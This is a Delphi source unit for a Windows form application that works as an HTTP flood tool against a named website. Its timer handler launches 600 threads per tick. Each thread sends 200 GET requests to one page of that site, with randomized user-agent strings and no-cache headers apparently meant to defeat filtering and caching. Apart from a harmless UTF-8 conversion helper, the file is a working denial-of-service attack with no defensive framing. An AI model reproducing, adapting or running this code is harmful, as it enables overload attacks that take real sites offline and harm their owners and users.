unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, IdBaseComponent, IdComponent, IdTCPConnection, IdTCPClient,IdMultipartFormData,
  IdHTTP, IdIntercept, IdInterceptThrottler, StdCtrls, ExtCtrls;
type
        TMyDownLoad=class(TThread)
  protected
  procedure   Execute;override;
  procedure   Download;
  end; 



type
  TForm1 = class(TForm)
    idhtp1: TIdHTTP;
    IdInterceptThrottler1: TIdInterceptThrottler;
    mmo1: TMemo;
    tmr1: TTimer;
    procedure tmr1Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

  i1,j1:Integer;
implementation

{$R *.dfm}
function UTF8ToAnsiString(utf8str:string; CodePage:integer):AnsiString;
var
 i:integer;
 buffer:widestring;
 ch,c1,c2:byte;

begin
 result:='';
 i:=1;
 while i<=Length(utf8str) do begin
   ch:=byte(utf8str[i]);
   setlength(buffer,length(buffer)+1);
   if (ch and $80)=0 then //1-byte
      buffer[length(buffer)]:=widechar(ch)
   else begin
   if (ch AND $E0) = $C0 then begin // 2-byte
      inc(i);
      c1 := byte(utf8str[i]);
      buffer[length(buffer)]:=widechar((word(ch AND $1F) SHL 6) OR (c1 AND $3F));
    end
    else begin // 3-byte
      inc(i);
      c1 := byte(utf8str[i]);
      inc(i);
      c2 := byte(utf8str[i]);
      buffer[length(buffer)]:=widechar(
        (word(ch AND $0F) SHL 12) OR
        (word(c1 AND $3F) SHL 6) OR
        (c2 AND $3F));
    end;
    end;
   inc(i);
  end; //while
  i := WideCharToMultiByte(codePage,
           WC_COMPOSITECHECK or WC_DISCARDNS or WC_SEPCHARS or WC_DEFAULTCHAR,
           @buffer[1], -1, nil, 0, nil, nil);
  if i>1 then begin
    SetLength(Result, i-1);
    WideCharToMultiByte(codePage,
        WC_COMPOSITECHECK or WC_DISCARDNS or WC_SEPCHARS or WC_DEFAULTCHAR,
        @buffer[1], -1, @Result[1], i-1, nil, nil);
  end;
end;
procedure   TMyDownLoad.Download; 
Var
    UnitName,PathName:String;
    MyStream:TMemoryStream; 
    filepath:string;
    idHTTP1:   TIDHttp;
  j1,j:Integer;
  poststr:string;
 IdInterceptThrottler:tIdInterceptThrottler;
  postStream : TStringStream;


begin
//  IdInterceptThrottler:=tIdInterceptThrottler.Create;
//  IdInterceptThrottler.RecvBitsPerSec:=80;
idHTTP1:=   TIDHTTP.Create;
//IdHTTP1.Intercept:=IdInterceptThrottler;
  idHTTP1.Request.Connection:='Keep-Alive';
  idHTTP1.HandleRedirects := True;
  IdHTTP1.Request.Referer:='http://www.716580.com/';
//http.Request.RawHeaders.Values['Cookie']:=_SESSION;//自定义Cookie
//http.Request.CustomHeaders.Values['Cookie']:=Cookie; //也得加上，不然Cookie没有意义，研究了很多

  IdHTTP1.Request.UserAgent:='Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;'+IntToStr(Random(9999999999999))+' SV1; Maxthon)'+IntToStr(Random(9999999999999));
//  IdHTTP1.Request.ContentType:='application/x-www-form-urlencoded';
//  IdHTTP1.Request.Referer:='http://www.716580.com';
//  IdHTTP1.Request.Accept:='image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/msword, */*';
//  IdHTTP1.Request.AcceptLanguage:='zh-cn';
//IdHTTP1.Request.AcceptEncoding:='gzip, deflate';
  IdHTTP1.Request.CacheControl:='no-cache';
  IdHTTP1.ReadTimeout:=30;
  IdHTTP1.HTTPOptions:=IdHTTP1.HTTPOptions+[hoKeepOrigProtocol]; //关键这行
  IdHTTP1.ProtocolVersion:=pv1_1;
  idhttp1.HandleRedirects:=True;
for i1 :=0  to 199 do
begin
   idHTTP1.Get('http://www.716580.com/b2b/land/index.asp');
end;
idhttp1.Free;

end;
procedure   TMyDownLoad.Execute;
begin
            inherited;
            Download;
end;


procedure TForm1.tmr1Timer(Sender: TObject);
begin
for j1:=0 to 599 do
try
  TMyDownLoad.Create(false);
except

end;



end;
end.
